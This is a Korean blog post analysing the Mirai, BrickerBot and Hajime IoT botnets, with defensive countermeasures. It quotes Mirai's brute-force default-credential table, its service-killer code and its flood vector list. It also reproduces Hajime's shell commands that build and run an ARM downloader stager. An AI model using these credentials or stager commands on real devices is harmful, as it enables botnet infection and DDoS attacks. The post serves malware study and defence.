---
layout: post
title:  "IoT Botnet Analysis"
tag:   Analysis
categories: IoT Analysis mirai Bricker persu
modified: 2017-04-26
comments: true
featured: true
---

# Mirai Botnet

- 원문(Reference) : https://security.radware.com/ddos-threats-attacks/threat-advisories-attack-reports/mirai-botnet/

Mirai Botnet은 대규모 DDoS 공격을 3건 발생 시켰으며, 강력하고 정교한 방식으로 DDos를 발생 시킨다.

Mirai Botnet은 1TB 급 트래픽 발생을 통해 공격 서비스 거부 시킬 수 있으며, 공격 방식은 미리 정의된 10가지 벡터가 존재한다.
그 중 GRE Flood, TCP STOMP, Water Torture, DNS Query 호출과 같은 공격 벡터가 존재하게 된다.

### IoT Device가 DDoS Botnet 으로  매력적인 이유
1. EndPoint 보안의 부재
2. IoT 디바이스의 안전 및 보안에 관한 규정이나 표준이 부재하여 기본 암호 정책, 액세스 제어 권한, 보안 구성과 같은 설정이 미흡
3. 24시간 * 365일 사용이 가능
4. 0-day Attack이 비교적 쉽기 때문에 빠른 감염이 가능

Botnet은 "C" 로 구현되어 있으며, C&C 서버는 "GO"로 구현되어 있다.


## Mirai botnet 동작과정

- 구현을 통한 분석 : https://www.rsaconference.com/writable/presentations/file_upload/hta-w10-mirai-and-iot-botnet-analysis.pdf

### 1. brute force을 통한 IoT Device 접근

Mirai Botnet은 기본적으로 공인 IP를 가진 IoT Device에 포트 스캔을 실시하며(shodan 과 같은 웹 사이트 이용) SSH, Telnet과 같이 원격에서 시스템에 접근 가능한 (Shell 접근을 의미) 포트를 스캔하게 되고 미리 정의된 계정을 brute force 공격을 하게 된다.

- Telmet, SSH brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
```

위 내용을 통해 다양한 디폴트 계정을 가지고 있는 것을 알 수 있다.

### 2. Find CPU info

위 디폴트 계정을 통해 shell에 접근하게 되면, Botnet을 생성하기 위해 CPU 버전을 아래 그림과 같이 확인하게 된다. MIPS, ARM, x86 etc...

<img src="{{ site.url }}/images/persu/mirai.png" style="display: block; margin: auto;">

### 3. Mirai Botnet Download
1,2 번 단계를 거치게 되면 실제로 Botnet을 다운로드 받게 되는데 /bin/busybox 에서 wget, tftp, ECCHI 명령어가 실행되는지 찾게 된다.

<img src="{{ site.url }}/images/persu/mirai0.png" style="display: block; margin: auto;">

만약 위의 명령어가 없을 시 echo -ne 명령어를 통해 "upnp" 라는 바이너리를 만들게 된다. (이거 보통 삽질 아님....)

<img src="{{ site.url }}/images/persu/mirai1.png" style="display: block; margin: auto;">

### 4. Start Mirai Botnet
3번 과정을 통해 Mirai Botnet을 다운로드 받은 이후에는 실행하게 되는데 "mirai" 라는 메시지가 발생하는 것을 확인 할 수 있다.

<img src="{{ site.url }}/images/persu/mirai2.png" style="display: block; margin: auto;">

### 5. Port Kill & restart
Mirai botnet이 실행하면 처음 기존에 활성화 되었던 Telnet, SSH, HTTP 서비스를 죽이고 다른포트로 활성화 시키는 방법이다. 이는 botnet 감염의 대응을 늦추기 위함이라고 생각한다.

Telnet, SSH, HTTP Kill : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/killer.c

```c
// Kill telnet service and prevent it from restarting
#ifdef KILLER_REBIND_TELNET
#ifdef DEBUG
    printf("[killer] Trying to kill port 23\n");
#endif
    if (killer_kill_by_port(htons(23)))
    {
#ifdef DEBUG
        printf("[killer] Killed tcp/23 (telnet)\n");
#endif
    } else {
#ifdef DEBUG
        printf("[killer] Failed to kill port 23\n");
#endif
    }
    tmp_bind_addr.sin_port = htons(23);

    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
        listen(tmp_bind_fd, 1);
    }
#ifdef DEBUG
    printf("[killer] Bound to tcp/23 (telnet)\n");
#endif
#endif
```

### 6. Command & Control
C&C 서버는 활성화된 Telnet, SSH 포트를 통해 명령을 전송하게 된다.

기본적으로 TCP SYN, ACK Flooding과 같은 기본적인 DDoS 공격 벡터 뿐만 아니라 새롭게 발견되고 있는 GRE IP, Ethernet Flooding 또한 공격 벡터에 가지고 있다. DDoS 탐지 기법을 우회하는 공격 벡터까지 구성된다.

- DDoS vector : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack.h

```
#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
//#define ATK_VEC_PROXY      8  /* Proxy knockback connection */
#define ATK_VEC_UDP_PLAIN  9  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
```

# Bricker botnet


본 글은 최근 이슈가 되고 있는 IoT Botnet인 Bricker에 대해 조사해 보았다.
원문(Reference) : https://security.radware.com/ddos-threats-attacks/brickerbot-pdos-permanent-denial-of-service/

- Botnet : https://ko.wikipedia.org/wiki/%EB%B4%87%EB%84%B7

IoT 시대에서 많은 디바이스들이 점차적으로 인터넷을 사용하게 되는 초연결 사회가 이뤄지고 있다. 이런 IoT의 가용성을 해치는 PDoS 공격이 급증하고 있다.

- PDoS(Permanent Denial of Service attacks) : 영구적인 서비스 거부 공격

이러한 PDoS 공격은 시스템을 손상시켜 하드웨어를 교체하거나 다시 설치해야 하는 공격이다. 시스템을 과부화를 일으키는 DDoS와는 약간 다른 형태의 DoS다.

1,895 건의 PDoS 공격을 일으킨 Bricker_Bot은 두 차례 공격 시도를 하였으며, C&C 서버는 TOR Node에 의해 발견되지 않았다.

Bricker_Bot의 공격 방식은 "Telnet brute force" 에서 부터 시작된다. Telnet brute force은 Mirai에서 사용된 것과 동일한 공격 코드이며, 아래 github에서 내용을 확인 할 수 있다.

- Mirai code : https://github.com/jgamblin/Mirai-Source-Code

Telnet brute force 방식에 사용되었던 자체 DB는 아래 소스 코드와 같다.

- Telmet brute force : https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/scanner.c

```c

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
...
```

기본적인 Telnet 을 구성하기 위해 TCP/IP Protocol Header을 구성하고, add_auth_entry에 있는 IoT 디바이스의 초기 계정을 접근하게 구성하였다.

"Telnet brute force"를 통해 시스템에 접근하게 되면(shell 접근을 의미) 먼저 장치 손상(Corrupting a Device)을 입히게 됩니다.

### Corrupting a Device

PDos의 가장 큰 목적인 장치 손상은 Linux shell code를 실행 시켜 인터넷 연결, 장치 성능이 정의된 파일을 지우는 명령을 수행한다.

<img src="{{ site.url }}/images/persu/brickerbot1.jpg" style="display: block; margin: auto;">

플래시 카드, 메모리 등 표준과 일치하는 저장 매체가 랜덤한 값으로 덮어 쓰여지게 된다.
이후 route del을 통해 routing table을 삭제하게 된다. 이럴 경우 리눅스는 다시 routing 작업을 실시하게 되는데 이를 막기 위해 sysctl 명령을 통해 커널 매개 변수를 조작하게 된다.

- net.ipv4.tcp_timestamps=0 : TCP timestamps를 0으로 설정 WAN 구간에서 네트워크가 안되는 현상 발생
- kernel.threads-max=1 : 커널에서 발생할 수 있는 최대 스레드를 -1로 설정

이렇게 되면 저장매체에 있는 데이터는 임의의 값으로 초기화가 될 것이며, 네트워크 통신 또한 이뤄지지 않게 된다.

### Target
일차적으로 공격 대상이 되는 IoT 디바이스는 Mirai_Bot에 존재하는 auth_entry 계정을 가진 디바이스이며, busybox 기반의 Telnet을 지원하는 디바이스이다. 이 디바이스는 공인망에 포트가 오픈되어 있는 특징을 가지게 된다.
더 나아가 dropbear SSH 와 같이 22번 포트가 오픈되어 있는 디바이스 또한 공격의 대상이 되기도 한다.


전 세계적으로 한번에 333 여곳에서 PDoS를 발생시켰어며, 다음 명령 수행을 하는 bricker_bot version 2는 아래와 같다.

<img src="{{ site.url }}/images/persu/brickerbot2.jpg" style="display: block; margin: auto;">

rm -rf 를 통해 모든 장치를 지워버리며, TCP timestamps 비활성화, 커널 스레드 최대수 1 뿐 만 아니라 iptables를 초기화 하며 NAT 규칙까지 삭제하고 out-bound packet을 차단하게 되어 네트워크 통신이 이뤄지지 않도록 구성한다.


### Time
두 PDoS 공격은 같은 날과 거의 같은 시간에 시작되었다. 2017 년 3 월 20 일 9.51PM, 2017 년 3 월 20 일 9.10PM 두 차례 발생하였다. BrickerBot.1의 첫 번째 PDoS 공격은 중지되었지만 더 치밀하게 TOR 출구 노드를 사용하는 BrickerBot.2의 공격은 여전히 ​​활성화되어 진행 중이다.

### Protecting
BrickerBot 감염을 막기 위해서는 가장 기본적인 대응방안이 필요하다. 각 디바이스는 Telnet, SSH와 같은 원격 단말 관리 서비스를 비활성화 시켜야 하며, 필요에 의해 활성화 시킬 경우 각 디바이스 별로 유니크한 패스워드 정책을 수립해야 한다. 특히 SSH 사용 시 로그인 방식이 아닌 키교환을 통해 로그인할 수 있도록 구성해야 한다.


# Hajime

원문 : http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/

2017년 4월 27일 16시 경 유명 보안 회사인 "Kaspersky Lab"에 따르면 신종 IoT botnet인 "Hajime"에 300,000 여 IoT Device가 감염되었다고 한다. (사용된 libutp에 2013년이라 표시됨)

이번 Hajime botnet은 2016년 10월 Rapinity Networks의 보안 연구원에 의해 처음 발견되었으며 꾸준히 확산되고 있는 상황이다.

대부분 공격 대상은 웹캡, DVR으로 나타나고 있습니다.
국가별 통계는 베트남 20%, 대만 13%, 브라질 9% 정도로 나타나고 있다.

## Hajime botnet 동작 과정

원문 : https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf

### 1. 정찰
정찰 부분은 실제로 botnet이 감염된 것은 아니며, 실제 공격을 수행하는 attcking node가 무작위로 ipv4 대역대의 23번 텔넷 포트를 스캔하게 됩니다.
이후 텔넷 오픈되어 있는 것을 확인하면 attacking node가 가지고 있는 알려진 디폴트 ID/PW를 대입하게 됩니다.

이때 Hajime botnet이 mirai botnet과 "Telnet brute force"공격에서 다른 점은 알려진 디폴트 ID/PW를 순차적으로 대입해보는 것이다. (mirai botnet의 경우 무작위 대입)

Telnet brute force를 통해 shell에 접근이 가능하면 아래 5가지의 명령어를 실행 한다.

```
enable
system
shell
sh
/bin/busybox ECCHI
```

위 명령 중 enable, system, shell, sh 4가지 명령은 shell을 실행 시키기 위함이며, 마지막 /bin/busybox ECCHI를 통해 shell이 잘 실행되는지 파악하기 위함이다. 성공적인 shell 접근을 하기 위해 에러를 발생하는 것이며, mirai의 변형임을 나타나는 부분이기도 하다.

### 2. 침투
정상적으로 IoT Device에 접근하게 되면 아래 명령을 실행하여 현재 시스템 마운트 상황을 확인하게 된다.

```
cat /proc/mounts; /bin/busybox ECCHI

rootfs / rootfs rw 0 0
/dev/root / jffs2 ro,noatime 0 0
/proc /proc proc rw,nodiratime 0 0
devpts /dev/pts devpts rw 0 0
none /tmp ramfs rw 0 0
/dev/mtdblock6 /tmp/flash jffs2 rw,sync,noatime 0 0
ECCHI: applet not found
```

이후 hajime botnet을 생성하기 위해 시스템 내 쓰기 권한이 있는 /proc, /sys, /var, /tmp, / 등 타겟 디렉토리를 찾는다. 이후 아래 명령을 실행하게 된다.

```
# cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox ECCHI
# /bin/busybox chmod 777 .s; /bin/busybox ECCHI
# cat .s; /bin/busybox ECCHI
# /bin/busybox ECCHI;
```

실제 IoT Device에서 테스트 결과 /tmp 디렉토리에 .s 파일이 생성된 것을 확인 할 수 있었다.
```
# ls -al .s
-rwxrwxrwx    1 test     root       509436 Apr 28 23:56 .s
```

이 과정을 수행하는 이유는 3가지가 있다.

1. .s 바이너리의 유무 확인
2. 해당 디렉토리의 쓰기 가능 여부 확인
3. .s 바이너리를 생성함으로써 대상 IoT Device의 프로세서 결정

### 3. 1차 감염 : shell code download
침투 단계에서 이상이 없을 시 hajime botnet을 생성하게 된다.

```
# echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x44\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" > .s; /bin/busybox ECCHI
# echo -ne "\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3" >> .s; /bin/busybox ECCHI
# echo -ne "\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2" >> .s; /bin/busybox ECCHI
# echo -ne "\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x12\x1c\xc6\x33\x64\x7b\x41\x2a\x00\x00\x00\x61\x65\x61" >> .s; /bin/busybox ECCHI
# echo -ne "\x62\x69\x00\x01\x20\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x0a\x03\x0c\x01\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75" >> .s; /bin/busybox ECCHI
# echo -ne "\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00" >> .s; /bin/busybox ECCHI
# echo -ne "\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" >> .s; /bin/busybox ECCHI
# echo -ne "\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" >> .s; /bin/busybox ECCHI
# cp .s .i; >.i; ./.s>.i; ./.i; rm .s; /bin/busybox ECCHI
```

echo -ne 명령은 16진수(hex) 문자열을 바이너리 파일로 만들 때 사용하는 명령이다.

```
study persu$ file .s
.s: ERROR: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked error reading
study persu$ ls -al .s
-rw-r--r--  1 persu  staff  484  4 29 00:24 .s
```

file 명령어를 통해 확인 결과 ARM CPU에 맞게 바이너리가 구성된 것을 알 수 있다.
최종적으로 실제 hajime bonet이 484 byte의 ELF 파일로 만들어 지게 된다.

<img src="{{ site.url }}/images/persu/arm.png" style="display: block; margin: auto;">

ARM 프로세서는 공부 중에 있어 완벽하게 이해를 못한 상황이다(shell code 인걸로 추정). 원문을 통해 TCP 연결을 통해 byte date를 host로 보내고 수신 된 모든 byte를 stdout으로 출력합니다. stdout은 .i 파일로 파이프되어 실행되는 것을 알 수 있다.

hajime botnet hash : https://github.com/Psychotropos/hajime_hashes

### 4. 2차 감염 : DHT Downloader
이 단계는 hajime botnet이 P2P 네트워크에서 payload를 검색하고 실행하는 단계이다. P2P 네트워크는 BitTorrent에서 사용되는 여러 프로토콜을 기반으로 사용한다.

Hajime는 피어 검색 및 uTP(데이터 교환) 위해 BitTorrent의 DHT 프로토콜을 사용한다.

1. 자체 개발한 라이브러리 다운로드
2. 정보 교환을 위해 Hajime은 BitTorrent DHT 프로토콜 준비 (piggybacks on BitTorrent’s DHT overlay network)
3. Hajime은 피어와 함께 파일을 전송하기 위해 libutp에있는 uTP 구현
4. Hajime은 LZ4방식으로 압축 된 페이로드를 포함한 파일을 다운로드
5. 시그니처 핑거 프린팅을 통해 페이로드 파일을 식별
6. 메인 루틴인 KadNode 함수 내 conf_init와 conf_check를 통해 기본 할당 및 초기화를 담당
7. pool.ntp.org에 대한 쿼리로 결과를에서 오프셋으로 NTP 캐싱
8. 실행 후 프로세스 이름 변경 : 먼저, strcpy 함수를 사용
prctl (PR_SET_NAME,argv [0]) syscall. 을 통해 프로세스의 argv [0]에 "telnetd"문자열로 변환 -> 자신을 telent으로 속이기 위함 (.p / .d 프로세스가 telnet으로 변환)

### 5. 실행

피어로 부터 가장 최신의 설정 파일을 다운로드 하기 위해 설정
BitTorrent DHT의 피어 조회시 Torrent 메타 데이터의 SHA1 해시 값을 생성하기 위해 160 비트 "info_hash"값을 생성한다.

#### info_hash 생성 로직
1. 현재 UTC 정보 확인
2. D(몇일)-M(1월:0, 2월:1)-Y(현재년수 - 1900)-W(일요일:0, 금요일:6)-Z(x월x일-1월1일) 형식으로 UTC 정보 변환
- ex) Oct. 1, 2016, date as 1-9-116-6-274,
3. 하이픈 ('-')을 추가 해당 날짜의 16 진수 표현
4. 전체 문자열에 대한 SHA1 해시를 계산하여 info_hash 생성

uTP를 이용해 10분 마다 info_hash를 가진 피어에 도달하여 설정파일을 다운로드 받고 파싱하게 된다.

```
[modules]
exp.arm5.1475686338
.i.arm5.1475781691
exp.x64.1476038380
exp.arm7.1476190023
.i.mipsel.1476038376
.i.arm7.1475797474
exp.mipsel.1476249252
[peers]
router.utorrent.com
router.bittorrent.com
```

info_hash를 가진 피어에 도달한 설정파일의 모듈(바이너리)과 피어는 위 내용과 같다. (계속 변함)
모듈을 통해 다양한 프로세서를 지원하는 것을 알 수 있으며, ".(콤마)" 를 통해 파일이름, 모듈, 타임스탬프를 구분하게 된다.

위 모듈의 정보와 자신이 가지고 있는 모듈의 정보를 비교하여 최신 날짜의 모듈을 다운로드하게 된다.
이때 hajime에 감염된 프로세서에 맞는 모듈을 .p 디렉토리에 다운로드 받게 된다.

실행 중인 모듈에 대해서는 .p/.d에 설정파일을 저장하며, 새로운 바이너리를 .i로 압축 해제하여 execv를 이용해 실행하게 된다.

### 6. 전파

exp 모듈(바이너리)의 다른 IoT Device에 Telnet brute force를 통해 hajime botnet을 전파하는 역할이다.

## Hajime botnet 대책

### 1. Block UDP packets containing P2P traffic
hajime botnet은 기본적으로 UDP 기반의 P2P 프로토콜을 사용하는 것이다. 이때 사용되는 주요 메시지를 차단하는 방법이다.

```
00 00 00 21 00 00 c0 dd 26 97 c4 a1 7d f8 3f 36
a9 97 99 dd 38 49 58 72 84 90 fa c7 d1 31 82 05
2d 88 4e 6e 42 84
```

### 2. Block TCP connections containing attack traffic
"/bin/busybox ECCHI" 명령 사용은 mirai, hajime의 공통점이다. 해당 문자열이 포함된 패킷을 차단하거나 감염 의심해야 한다.

### 3. Block TCP port
1차 감염이후 2차 감염을 위해 파일을 다운로드 하는 port는 4636으로 정해져 있다. blacklist방식으로 port 차단하는 것은 좋은 방법은 아니지만 이 방법 또한 하나의 대응방안이 될 수 있다.

## Hajime botnet 목적
hajime botnet의 목적은 대량의 IoT Device를 감염시켜 DDoS에 사용하기 위함이 기본이다.
하지만 mirai와 같이 오픈소스화 되지 않아 공격자가 정의한 페이로드에 따라 다양한 목적에 사용될 것이다.

## Hajime와 mirai의 관계
Hajime는 mirai와 최초 디바이스 접근 부분이 Telnet을 사용하고 있고 명령 수행시 ECCHI를 사용하지만 동작과정은 botnet의 한 종류인 qbot과 많이 유사하다. mirai의 변종으로 속이기 위한 수단이 아닐까 한다.

# Amnesia
